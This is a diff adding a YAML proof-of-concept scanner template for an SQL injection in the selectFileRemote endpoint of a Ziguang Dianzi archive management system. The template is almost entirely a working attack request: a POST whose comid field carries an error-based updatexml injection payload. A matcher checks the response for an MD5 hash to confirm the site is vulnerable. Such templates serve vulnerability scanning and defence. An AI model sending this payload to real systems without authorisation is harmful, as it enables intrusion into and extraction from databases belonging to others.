@@ -1,0 +1,24 @@
+name: poc-yaml-ziguangdianzi-selectFileRemote-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Archive/ErecordManage/selectFileRemote
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+      body: userID=admin&fondsid=1&comid=' and updatexml(1,concat(0x7e,MD5(123456),0x7e),1)=1
+    expression: response.body.bcontains(b'~e10adc3949ba59abbe56e057f20f883')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487235&idx=1&sn=25f8a0b4ebc42cf005e8183f5256e51e&chksm=c267ba30f5103326d99ede96b761468f0da2eb174293443821dccd30fbecbd871a42791191c3&token=101124693&lang=zh_CN#rd
+
+
+
